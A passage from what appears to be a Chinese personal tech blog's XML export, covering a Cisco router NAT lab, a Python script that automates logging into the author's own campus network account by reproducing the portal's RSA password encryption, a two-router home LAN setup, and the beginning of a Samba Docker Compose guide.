<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>该篇实验参照自《计算机网络实验指导书—20190220.pdf》与配套视频。</p>
]]></content>
      <categories>
        <category>技术篇</category>
        <category>计算机网络原理</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络原理实验五──地址转换NAT</title>
    <url>/archives/Principles-Of-Computer-Networks-Experiment-5.html</url>
    <content><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>1941 Router，2PC，使用 Copper Cross-over 连接，要求左接口ip为192.168.1.1，右接口ip为200.8.7.1，网络拓扑如下</p>
<p><img data-src="/images/Article/Principles-Of-Computer-Networks-Experiment/Network-Topology.png" alt="Network-Topology.png"></p>
<span id="more"></span>

<h2 id="配置接口g0-0"><a href="#配置接口g0-0" class="headerlink" title="配置接口g0/0"></a>配置接口g0/0</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router&gt;en</span><br><span class="line">Router#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Router(config)#int g0/<span class="number">0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip addr <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface GigabitEthernet0/<span class="number">0</span>, changed state to up</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">0</span>, changed state to up</span><br></pre></td></tr></table></figure>

<h2 id="配置接口g0-1"><a href="#配置接口g0-1" class="headerlink" title="配置接口g0/1"></a>配置接口g0/1</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router(config-<span class="keyword">if</span>)#int g0/<span class="number">1</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip addr <span class="number">200.8</span><span class="number">.7</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br></pre></td></tr></table></figure>

<h2 id="配置两台pc的ip地址"><a href="#配置两台pc的ip地址" class="headerlink" title="配置两台pc的ip地址"></a>配置两台pc的ip地址</h2><p>直接双击配置，pc1设置192.168.1.5，PC2设置200.8.7.100</p>
<h2 id="定义NAT内网口和外网口"><a href="#定义NAT内网口和外网口" class="headerlink" title="定义NAT内网口和外网口"></a>定义NAT内网口和外网口</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router(config)#int g0/<span class="number">1</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip nat outside</span><br><span class="line">Router(config-<span class="keyword">if</span>)#int g0/<span class="number">0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip nat inside</span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br></pre></td></tr></table></figure>

<h1 id="静态NAT"><a href="#静态NAT" class="headerlink" title="静态NAT"></a>静态NAT</h1><h2 id="配置静态NAT"><a href="#配置静态NAT" class="headerlink" title="配置静态NAT"></a>配置静态NAT</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router(config-<span class="keyword">if</span>)#ip nat inside source <span class="keyword">static</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.3</span></span><br><span class="line">Router(config)#</span><br></pre></td></tr></table></figure>

<h2 id="目前的配置信息"><a href="#目前的配置信息" class="headerlink" title="目前的配置信息"></a>目前的配置信息</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router(config-<span class="keyword">if</span>)#<span class="keyword">do</span> show run</span><br><span class="line">Building configuration...</span><br><span class="line"></span><br><span class="line">Current configuration : <span class="number">716</span> bytes</span><br><span class="line">!</span><br><span class="line">version <span class="number">15.1</span></span><br><span class="line">no service timestamps log datetime msec</span><br><span class="line">no service timestamps debug datetime msec</span><br><span class="line">no service password-encryption</span><br><span class="line">!</span><br><span class="line">hostname Router</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip cef</span><br><span class="line">no ipv6 cef</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">license udi pid CISCO1941/K9 sn FTX15248DH1-</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">spanning-tree mode pvst</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">interface GigabitEthernet0/<span class="number">0</span></span><br><span class="line"> ip address <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line"> ip nat inside</span><br><span class="line"> duplex auto</span><br><span class="line"> speed auto</span><br><span class="line">!</span><br><span class="line">interface GigabitEthernet0/<span class="number">1</span></span><br><span class="line"> ip address <span class="number">200.8</span><span class="number">.7</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line"> ip nat outside</span><br><span class="line"> duplex auto</span><br><span class="line"> speed auto</span><br><span class="line">!</span><br><span class="line">interface Vlan1</span><br><span class="line"> no ip address</span><br><span class="line"> shutdown</span><br><span class="line">!</span><br><span class="line">ip nat inside source <span class="keyword">static</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.3</span> </span><br><span class="line">ip classless</span><br><span class="line">!</span><br><span class="line">ip flow-<span class="keyword">export</span> version <span class="number">9</span></span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">line con <span class="number">0</span></span><br><span class="line">!</span><br><span class="line">line aux <span class="number">0</span></span><br><span class="line">!</span><br><span class="line">line vty <span class="number">0</span> <span class="number">4</span></span><br><span class="line"> login</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br></pre></td></tr></table></figure>

<h2 id="产生NAT记录"><a href="#产生NAT记录" class="headerlink" title="产生NAT记录"></a>产生NAT记录</h2><p>使用PC1 ping PC2</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">C:\&gt;ping <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Request timed out.</span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">3</span>, Lost = <span class="number">1</span> (<span class="number">25</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\&gt;</span><br></pre></td></tr></table></figure>

<p>再回到Router，输入show ip nat translations</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router#show ip nat translations </span><br><span class="line">Pro  Inside <span class="built_in">global</span>     Inside local       Outside local      Outside <span class="built_in">global</span></span><br><span class="line">icmp <span class="number">200.8</span><span class="number">.7</span><span class="number">.3</span>:<span class="number">5</span>       <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">5</span>      <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">5</span>      <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">5</span></span><br><span class="line">icmp <span class="number">200.8</span><span class="number">.7</span><span class="number">.3</span>:<span class="number">6</span>       <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">6</span>      <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">6</span>      <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">6</span></span><br><span class="line">icmp <span class="number">200.8</span><span class="number">.7</span><span class="number">.3</span>:<span class="number">7</span>       <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">7</span>      <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">7</span>      <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">7</span></span><br><span class="line">---  <span class="number">200.8</span><span class="number">.7</span><span class="number">.3</span>         <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>        ---                ---</span><br><span class="line"></span><br><span class="line">Router#</span><br></pre></td></tr></table></figure>

<h1 id="动态NAT"><a href="#动态NAT" class="headerlink" title="动态NAT"></a>动态NAT</h1><p>使用 access-list 配置动态NAT，相关功能与配置信息如下</p>
<h2 id="定义默认路由内部本地地址范围"><a href="#定义默认路由内部本地地址范围" class="headerlink" title="定义默认路由内部本地地址范围"></a>定义默认路由内部本地地址范围</h2><p>这里的10我猜测是可通过10个不同的192.168.1.0/24地址访问？</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router(config)#access-list ?</span><br><span class="line">  &lt;<span class="number">1</span>-<span class="number">99</span>&gt;     IP standard access list</span><br><span class="line">  &lt;<span class="number">100</span>-<span class="number">199</span>&gt;  IP extended access list</span><br><span class="line">Router(config)#access-list <span class="number">10</span> ?</span><br><span class="line">  deny    Specify packets to reject</span><br><span class="line">  permit  Specify packets to forward</span><br><span class="line">  remark  Access list entry comment</span><br><span class="line">Router(config)#access-list <span class="number">10</span> permit ?</span><br><span class="line">  A.B.C.D  Address to match</span><br><span class="line">  any      Any source host</span><br><span class="line">  host     A single host address</span><br><span class="line">Router(config)#access-list <span class="number">10</span> permit <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.255</span></span><br><span class="line">Router(config)#</span><br></pre></td></tr></table></figure>

<h2 id="定义转换全局地址池"><a href="#定义转换全局地址池" class="headerlink" title="定义转换全局地址池"></a>定义转换全局地址池</h2><p>这里的200.8.7.10与200.8.7.20<del>我猜测</del>（确实）是使用地址范围，至于这个abc应该是个地址池名称？如有错误欢迎大家之处0w0</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router(config)#ip nat ?</span><br><span class="line">  inside   Inside address translation</span><br><span class="line">  outside  Outside address translation</span><br><span class="line">  pool     Define pool <span class="keyword">of</span> addresses</span><br><span class="line">Router(config)#ip nat pool ?</span><br><span class="line">  WORD  Pool name</span><br><span class="line">Router(config)#ip nat pool abc ?</span><br><span class="line">  A.B.C.D  Start IP address</span><br><span class="line">Router(config)#ip nat pool abc <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span> ?</span><br><span class="line">  A.B.C.D  End IP address</span><br><span class="line">Router(config)#ip nat pool abc <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.20</span> ?</span><br><span class="line">  netmask  Specify the network mask</span><br><span class="line">Router(config)#ip nat pool abc <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.20</span> netmask ?</span><br><span class="line">  A.B.C.D  Network mask</span><br><span class="line">Router(config)#ip nat pool abc <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.20</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>

<h2 id="建立映射关系"><a href="#建立映射关系" class="headerlink" title="建立映射关系"></a>建立映射关系</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router(config)#ip nat ?</span><br><span class="line">  inside   Inside address translation</span><br><span class="line">  outside  Outside address translation</span><br><span class="line">  pool     Define pool <span class="keyword">of</span> addresses</span><br><span class="line">Router(config)#ip nat inside ?</span><br><span class="line">  source  Source address translation</span><br><span class="line">Router(config)#ip nat inside source ?</span><br><span class="line">  list    Specify access list describing local addresses</span><br><span class="line">  <span class="keyword">static</span>  Specify <span class="keyword">static</span> local-&gt;<span class="built_in">global</span> mapping</span><br><span class="line">Router(config)#ip nat inside source list ?</span><br><span class="line">  &lt;<span class="number">1</span>-<span class="number">199</span>&gt;  Access list number <span class="keyword">for</span> local addresses</span><br><span class="line">  WORD     Access list name <span class="keyword">for</span> local addresses</span><br><span class="line">Router(config)#ip nat inside source list <span class="number">10</span> ?</span><br><span class="line">  interface  Specify interface <span class="keyword">for</span> <span class="built_in">global</span> address</span><br><span class="line">  pool       Name pool <span class="keyword">of</span> <span class="built_in">global</span> addresses</span><br><span class="line">Router(config)#ip nat inside source list <span class="number">10</span> pool ?</span><br><span class="line">  WORD  Name pool <span class="keyword">of</span> <span class="built_in">global</span> addresses</span><br><span class="line">Router(config)#ip nat inside source list <span class="number">10</span> pool</span><br></pre></td></tr></table></figure>

<h2 id="检查地址转换表"><a href="#检查地址转换表" class="headerlink" title="检查地址转换表"></a>检查地址转换表</h2><p>使用PC1 ping PC2，检查</p>
<p>地址转换表</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router(config)#show ip nat translations</span><br><span class="line">                ^</span><br><span class="line">% Invalid input detected at <span class="string">&#x27;^&#x27;</span> marker.</span><br><span class="line">	</span><br><span class="line">Router(config)#<span class="keyword">do</span> show ip nat translations</span><br><span class="line">Pro  Inside <span class="built_in">global</span>     Inside local       Outside local      Outside <span class="built_in">global</span></span><br><span class="line">icmp <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span>:<span class="number">10</span>     <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">10</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">10</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">10</span></span><br><span class="line">icmp <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span>:<span class="number">11</span>     <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">11</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">11</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">11</span></span><br><span class="line">icmp <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span>:<span class="number">12</span>     <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">12</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">12</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">12</span></span><br><span class="line">icmp <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span>:<span class="number">13</span>     <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">13</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">13</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">13</span></span><br><span class="line"></span><br><span class="line">Router(config)#</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>技术篇</category>
        <category>计算机网络原理</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Python 登录校园网的一次探索</title>
    <url>/archives/Python-School-Network.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开学那段时间刚办完校园网宽带，学校每天晚上 12 点都会定时断网，每天 6 点又会将网络开启，断网就是将同学萌从校园网强制下线，然后禁止登录，每天都要重复登陆一次，觉得有点麻烦，先试了一下校园网是否允许路由器，发现可行，于是乎想着就随手在树莓派上跑个脚本，断网就自动执行。</p>
<p>写这篇玩意其实是因为没啥东西好水了，随便找个以前的来水一下，顺便记录一下之前的小操作</p>
<span id="more"></span>

<h1 id="搞起"><a href="#搞起" class="headerlink" title="搞起"></a>搞起</h1><h2 id="连接到校园网时的跳转"><a href="#连接到校园网时的跳转" class="headerlink" title="连接到校园网时的跳转"></a>连接到校园网时的跳转</h2><p>首先连接到校园网会有一个奇怪的跳转，generate_204 会首先被跳转到 <a href="http://123.123.123.123/">http://123.123.123.123</a> ，接着被跳转到学校的登录界面。获取 <a href="http://123.123.123.123/">http://123.123.123.123/</a> 的网页内容，会发现跳转所需要的参数之类的乱七八糟的东西，内容大概长这样</p>
<pre><code>&lt;script&gt;top.self.location.href=&#39;http://x.x.x.x/eportal/index.jsp?wlanuserip=xxxx&#39;&lt;/script&gt;
</code></pre>
<p>用来干啥的先不管，反正就知道连接到校园网时要跳转到这里</p>
<h2 id="登录到校园网时的加密"><a href="#登录到校园网时的加密" class="headerlink" title="登录到校园网时的加密"></a>登录到校园网时的加密</h2><p>这玩意好像不是所有学校都有，有的学校没有加密的，看情况</p>
<p>校园网的界面大概长这样（这个是自助服务的界面，登陆的界面不太一样，下面大概有个选择运营商）</p>
<p><img data-src="/images/Article/Python-School-Network/Snipaste_2020-02-09_20-09-05.png" alt="Snipaste_2020-02-09_20-09-05.png"></p>
<p>说实话，这个界面在开学前就有所耳闻了，好像大多数学校都会用这一种。。</p>
<p>输入账号密码，登录，看 post 内容，发现 password 项被加密了，name 就是用的输入框用户名的内容</p>
<p><img data-src="/images/Article/Python-School-Network/Snipaste_2020-02-09_20-13-21.png" alt="Snipaste_2020-02-09_20-13-21.png"></p>
<p>找到 password 加密所用的 js 文件 @/selfservice/common/self/js/security.js ，看开头写了几行注释</p>
<pre><code>/*
 * RSA, a suite of routines for performing RSA public-key computations in JavaScript.
 * Copyright 1998-2005 David Shapiro.
 * Dave Shapiro
 * dave@ohdave.com 
 * changed by Fuchun, 2010-05-06
 * fcrpg2005@gmail.com
 */
</code></pre>
<p>Google 搜索 <a href="mailto:&#102;&#99;&#x72;&#x70;&#x67;&#x32;&#x30;&#x30;&#x35;&#x40;&#103;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;">&#102;&#99;&#x72;&#x70;&#x67;&#x32;&#x30;&#x30;&#x35;&#x40;&#103;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;</a> ，发现有人做过加密的，但大多都是用 Python 来运行 js 代码获取结果。。虽然这样也可以，但总觉得哪里不优雅。</p>
<p>由注释可以大概得知，这玩意用的 RSA</p>
<p>在 Chrome 调试，发现调用过 RSAUtils.encryptedString ，于是断点调试下列代码</p>
<pre><code>RSAUtils.encryptedString = function(key, s) &#123;
    var a = [];
    var sl = s.length;
    var i = 0;
    while (i &lt; sl) &#123;
        a[i] = s.charCodeAt(i);
        i++;
    &#125;

    while (a.length % key.chunkSize != 0) &#123;
        a[i++] = 0;
    &#125;

    var al = a.length;
    var result = &quot;&quot;;
    var j, k, block;
    for (i = 0; i &lt; al; i += key.chunkSize) &#123;
        block = new BigInt();
        j = 0;
        for (k = i; k &lt; i + key.chunkSize; ++j) &#123;
            block.digits[j] = a[k++];
            block.digits[j] += a[k++] &lt;&lt; 8;
        &#125;
        var crypt = key.barrett.powMod(block, key.e);
        var text = key.radix == 16 ? RSAUtils.biToHex(crypt) : RSAUtils.biToString(crypt, key.radix);
        result += text + &quot; &quot;;
    &#125;
    return result.substring(0, result.length - 1); // Remove last space.
&#125;;
</code></pre>
<p>大概能知道，key 就是传入的公钥， s 就是字符串，只不过我传入的时候发现 s 是被倒置的，hmm 不是很懂</p>
<p>就在我在疑惑这key放在了哪的时候，看到了这个 @/selfservice/module/scgroup/js/login_self.js</p>
<p><img data-src="/images/Article/Python-School-Network/Snipaste_2020-02-09_20-45-07.png" alt="Snipaste_2020-02-09_20-45-07.png"></p>
<p>emm ，然后回去翻一翻 HTML 源码</p>
<p><img data-src="/images/Article/Python-School-Network/Snipaste_2020-02-09_20-47-02.png" alt="Snipaste_2020-02-09_20-47-02.png"></p>
<p>。。。就这玩意，前面的 10001 大概就是指数了，后面的那一串就是密钥本体了</p>
<p>至于 RSA 加密这个果果就不是很懂，<del>于是在 U2 的专业代打和蜜汁调试下搞定了</del></p>
<p>看样子，就是先给这个字符串的每一个字符都转换为 int，然后</p>
<p>然后直接上这一段的代码吧（确信</p>
<pre><code>def passwordEncrypt(self, password):
    m = 0x2bab3b5d45...... # 10001&amp; 后面那一串
    e = 0x00010001 # 就是 &amp; 前面那一串
    dec = 0
    decList = list(map(ord, reversed(password)))
    for i in range(len(decList)):
        dec += decList[-(i) - 1] &lt;&lt; (i * 8)
    return hex(dec**e%m)[2:]
</code></pre>
<p>然后说实话我还是不知道为啥要反转（</p>
<p>然后后来直接 Google 了一下 selfservice 校园网，发现别人都没有加密的就我们搞那么麻烦（戳手指）</p>
<p>自己加密一次，和控制台的输出无差别，成了</p>
<h2 id="发起上网请求"><a href="#发起上网请求" class="headerlink" title="发起上网请求"></a>发起上网请求</h2><h3 id="判断联网"><a href="#判断联网" class="headerlink" title="判断联网"></a>判断联网</h3><p>那要本来就上了网的话就没必要再去请求了，于是用 genarate_204 来检测一下是否成功联网</p>
<pre><code>def isConnected(self):
    try:
        reqTmp = requests.get(&quot;http://g.cn/generate_204&quot;)
    except:
        return False # 在请求的时候出错直接返回错误
    if reqTmp.status_code == 204:
        return True
    return False
</code></pre>
<p>大概就这么判断，还是有点粗糙</p>
<h3 id="一个-Post-请求"><a href="#一个-Post-请求" class="headerlink" title="一个 Post 请求"></a>一个 Post 请求</h3><p>按照校园网的提交格式，使用 python 的 request 大概写一下就可以了，最后他会返回一个 json，看看 json 的 result 值是否为 success</p>
<pre><code>queryRet = requests.get(&quot;http://123.123.123.123&quot;).text
param = &quot;index\.jsp\?(.*)\&#39;\&lt;\/script\&gt;&quot;
queryString = re.search(param, queryRet)[1]
postData = &#123;
    &quot;userId&quot;: userID,
    &quot;password&quot;: str(encryptedPassword),
    &quot;service&quot;: urllib.parse.quote(network),
    &quot;queryString&quot;: urllib.parse.quote(queryString),
    &quot;passwordEncrypt&quot;: &quot;true&quot;,
    &quot;validcode&quot;: &quot;&quot;,
    &quot;operatorPwd&quot;: &quot;&quot;,
    &quot;operatorUserId&quot;: &quot;&quot;,
&#125;
loginRet = requests.post(&quot;http://x.x.x.x/eportal/InterFace.do?method=login&quot;, data=postData).text
</code></pre>
<p>哦对了，这里 service 我校的方案是传上去一个大大的运营商名字，为什么得这么干我也不是很懂，都是外包的嘛（</p>
<p>比如 service = “联通” || “移动” # 意义不明</p>
<p>能够获取到返回的 result 就成啦</p>
<p>打开网页，联网成功~</p>
<h2 id="其他玩法"><a href="#其他玩法" class="headerlink" title="其他玩法"></a>其他玩法</h2><p>登录其实到这里就结束了，如果想要获取登录后的个人信息，例如姓名啥的啊乱七八糟的可以请求 @/eportal/InterFace.do?method=getOnlineUserInfo ，发现并不需要带参数，干 Get 就可以了，可以获取到 用户IP/ID/mac地址/用户组/运营商 其他啥啥啥的</p>
<h3 id="判断是否允许联网时段"><a href="#判断是否允许联网时段" class="headerlink" title="判断是否允许联网时段"></a>判断是否允许联网时段</h3><p>其实这里也挺暴力的，非周末时段12点断网，6点开网，大概这么判断</p>
<pre><code>def isLimited(self):
  now = datetime.datetime.now()
  if now.weekday() &lt; 6 and now.hour &lt; 6:
      return True
  return False
</code></pre>
<p>简 单 粗 暴</p>
<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>实际上这玩意自从开始写好以后，就没怎么用过，因为学校的网络认证服务器经常单 IP 请求次数一多就直接 block 了，真要用的时候还不是那么能用得上的，这玩意基本弄完就丢一边吃灰了。</p>
]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>校园网</tag>
      </tags>
  </entry>
  <entry>
    <title>双路由同内网段探索</title>
    <url>/archives/Router-Link.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>整这玩意儿已经是一年前的事了，无聊再拿出来晾一晾</p>
<p>我家的移动光纤入户进的是我的房间，然后光猫路由器全部都是丢在我的房间，致使我每次去客厅都会没有 WiFi 信号，于是就想着整俩路由器，买了一个 K2P ，但实际上使用感觉并不友好，因为我在房间里也有一个自己的电脑，平常插房间的路由器不能和 K2P 分到同一个内网，很不方便，上网搜了一下资料，发现可以用 LAN 口对接，关闭 K2P（副路由器） 的 DHCP，用房间的路由器（主路由器）分配即可。</p>
<span id="more"></span>

<h1 id="中言"><a href="#中言" class="headerlink" title="中言"></a>中言</h1><h2 id="准备材料"><a href="#准备材料" class="headerlink" title="准备材料"></a>准备材料</h2><p>房间的 Xiaomi Mini × 1</p>
<p>客厅的 K2P × 1</p>
<p>一条若干米长的网线 × 1</p>
<h2 id="干活儿"><a href="#干活儿" class="headerlink" title="干活儿"></a>干活儿</h2><p>两个路由器都被我刷成 Padavan 了，所以就直接动手</p>
<p>我的小米路由器信号也不咋滴，所以干脆就当成交换机用就行了</p>
<p>进入路由器1（小米路由器mini）后台，设置路由器地址（例如 192.168.123.1），与 DHCP 服务器选项卡（一般设置完路由器 IP 会自动设置）</p>
<p><img data-src="/images/Article/Router-Link/Xiaomi-mini-configuration.png" alt="/images/Article/Router-Link/Xiaomi-mini-configuration.png"></p>
<p><img data-src="/images/Article/Router-Link/Xiaomi-mini-configuration-2.png" alt="/images/Article/Router-Link/Xiaomi-mini-configuration-2.png"></p>
<p>然后进入路由器2（K2P）后台，设置路由器地址（例如 192.168.123.6），将 DHCP 服务器关闭，默认网关就 192.168.123.1</p>
<p><img data-src="/images/Article/Router-Link/K2P-configuration.png" alt="/images/Article/Router-Link/K2P-configuration.png"></p>
<p><img data-src="/images/Article/Router-Link/K2P-configuration-2.png" alt="/images/Article/Router-Link/K2P-configuration-2.png"></p>
<p>然后将 K2P 的 LAN 口和小米路由器 mini 的 LAN 口对接，在 K2P 上设置 WiFi 网络，锵锵，都能上网了，于是在 K2P 连上的电脑、手机，都和我房间的是一个内网的，在 K2P 上连接成功的设备也能在小米路由器 mini 上找到。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>本来事情是挺完美的，结果发现这样的话 K2P 只能做一个路由器，padavan 就失去了他的意义，因为这样接的话 K2P 自己是没有连接到网络的，看网上有解决方法，就是将 K2P（副路由器）自己的LAN 口插到自己的 WAN 口上。但可惜的是，没有这么多口给我用，所以 ，K2P 说他只想过平静的生活。</p>
<p>emm 如果有更好的方法的话，欢迎评论区留言～</p>
]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>校园网文件共享方案（Samba）</title>
    <url>/archives/Samba-Share.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为<del>(白嫖)</del>学习目的，从学校工作室<del>(白嫖)</del>借用了块硬盘，供工作室的小伙伴用，同时也可以在上面放一些自己的东西，但总是通过网页进行管理那总是不方便的啊，所以就想着使用 Samba 进行文件共享。</p>
<span id="more"></span>

<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>众所周知，万物皆可 Docker ，这次使用的是 <a href="https://github.com/dperson/samba">https://github.com/dperson/samba</a> 这个项目，那上面也有 DockerFile 了，所以也不重复造轮子了。</p>
<h2 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h2><p>众所周知，有 Docker 的地方就有 Docker Compose ，所以这里还是用 Docker Compose，这里人家已经给写好了，所以就直接参考此处。</p>
<blockquote>
<p>参考资料： <a href="https://github.com/dperson/samba/wiki/Using-Docker-Compose">https://github.com/dperson/samba/wiki/Using-Docker-Compose</a></p>
</blockquote>
<pre><code>version: &#39;3.4&#39;

services:
  samba:
    image: dperson/samba
    environment:
      TZ: &#39;EST5EDT&#39;
    networks:
      - default
    ports:
      - &quot;137:137/udp&quot;
      - &quot;138:138/udp&quot;
